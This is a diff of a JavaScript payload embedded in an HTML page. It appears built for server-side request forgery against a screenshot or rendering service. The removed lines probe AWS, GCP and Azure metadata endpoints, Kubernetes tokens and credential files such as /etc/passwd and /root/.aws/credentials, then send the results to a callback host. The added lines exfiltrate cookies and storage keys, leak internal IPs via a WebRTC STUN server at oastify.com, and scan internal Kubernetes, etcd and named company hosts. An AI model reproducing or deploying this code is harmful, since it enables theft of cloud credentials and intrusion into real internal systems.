@@ -9,57 +9,51 @@ function exfil(tag, data) {
   try { var x = new XMLHttpRequest(); x.open('GET', CB + '/x?t=' + encodeURIComponent(tag) + '&d=' + enc, false); x.send(); } catch(e) {}
 }
 
-function probe(tag, url, headers) {
-  try {
-    var x = new XMLHttpRequest();
-    x.open('GET', url, false);
-    if (headers) { for (var h in headers) x.setRequestHeader(h, headers[h]); }
-    x.send();
-    exfil(tag, 'HTTP ' + x.status + ' ' + x.responseText);
-  } catch(e) {
-    exfil(tag + ':ERR', e.message);
-  }
+function hold(label) {
+  var x = new XMLHttpRequest();
+  x.open('GET', CB + '/hold?l=' + encodeURIComponent(label), false);
+  try { x.send(); } catch(e) {}
 }
 
-exfil('start', 'alive');
+exfil('start', 'v4-alive');
+exfil('ua', navigator.userAgent);
+exfil('cookie', document.cookie || '(empty)');
+exfil('ls', JSON.stringify(Object.keys(localStorage || {})));
+exfil('ss', JSON.stringify(Object.keys(sessionStorage || {})));
 
-probe('aws-root',     'http://169.254.169.254/latest/meta-data/');
-probe('aws-iam-list', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/');
-probe('aws-userdata', 'http://169.254.169.254/latest/user-data');
-probe('aws-hostname', 'http://169.254.169.254/latest/meta-data/hostname');
-probe('aws-region',   'http://169.254.169.254/latest/meta-data/placement/region');
-
+var webrtcIPs = [];
 try {
-  var t = new XMLHttpRequest();
-  t.open('PUT', 'http://169.254.169.254/latest/api/token', false);
-  t.setRequestHeader('X-aws-ec2-metadata-token-ttl-seconds', '21600');
-  t.send();
-  var tok = t.responseText;
-  exfil('imdsv2-token', tok);
-  probe('imdsv2-iam', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', {'X-aws-ec2-metadata-token': tok});
-} catch(e) { exfil('imdsv2:ERR', e.message); }
+  var pc = new RTCPeerConnection({iceServers: [{urls: 'stun:xtugidit39jm7kmw4cl0ut51fslk99.oastify.com:3478'}]});
+  pc.onicecandidate = function(e) { if (e && e.candidate) webrtcIPs.push(e.candidate.candidate); };
+  pc.createDataChannel('probe');
+  pc.createOffer().then(function(o) { return pc.setLocalDescription(o); });
+} catch(e) { exfil('webrtc-err', e.message); }
 
-probe('gcp-all',   'http://metadata.google.internal/computeMetadata/v1/?recursive=true', {'Metadata-Flavor': 'Google'});
-probe('gcp-token', 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', {'Metadata-Flavor': 'Google'});
+var ar = {};
+function ap(tag, url) {
+  fetch(url, {mode: 'no-cors', cache: 'no-store'})
+    .then(function(r) { ar[tag] = 'ok:' + r.status + ':' + r.type; })
+    .catch(function(e) { ar[tag] = 'err:' + e.message; });
+}
 
-probe('azure-instance', 'http://169.254.169.254/metadata/instance?api-version=2021-02-01', {'Metadata': 'true'});
-probe('azure-identity', 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/', {'Metadata': 'true'});
+ap('k8s-443',    'https://kubernetes.default.svc/');
+ap('k8s-6443',   'https://kubernetes.default.svc:6443/');
+ap('k8s-kubelet','https://localhost:10250/');
+ap('k8s-etcd',   'https://localhost:2379/');
+ap('docker-gw',  'https://172.17.0.1/');
+ap('lo-443',     'https://localhost/');
+ap('lo-8443',    'https://localhost:8443/');
+ap('lo-9443',    'https://localhost:9443/');
+ap('screenshooter-api', 'https://screenshooter.dev.stravito.com/api/');
+ap('int-api',    'https://internal.api.stravito.com/api/v1/');
 
-probe('k8s-ns',    'http://kubernetes.default.svc/api/v1/namespaces/');
-probe('k8s-token', 'file:///var/run/secrets/kubernetes.io/serviceaccount/token');
+hold('h1'); hold('h2'); hold('h3');
+exfil('async1', JSON.stringify(ar));
+exfil('webrtc1', JSON.stringify(webrtcIPs));
 
-probe('etc-passwd',   'file:///etc/passwd');
-probe('proc-environ', 'file:///proc/self/environ');
-probe('aws-creds',    'file:///root/.aws/credentials');
-
-[80,443,3000,4000,5000,8000,8080,8443,8888,9000,9200,6379,27017,5432,3306,2375].forEach(function(p) {
-  probe('lo:' + p, 'http://127.0.0.1:' + p + '/');
-});
-
-probe('screenshooter', 'https://screenshooter.dev.stravito.com/');
-probe('internal-api',  'https://internal.api.stravito.com/');
-probe('internal',      'https://internal.stravito.com/');
-
-exfil('done', 'all probes finished');
+hold('h4'); hold('h5'); hold('h6'); hold('h7'); hold('h8'); hold('h9'); hold('h10');
+exfil('async2', JSON.stringify(ar));
+exfil('webrtc2', JSON.stringify(webrtcIPs));
+exfil('done', 'v4-complete');
 </script>
 </html>
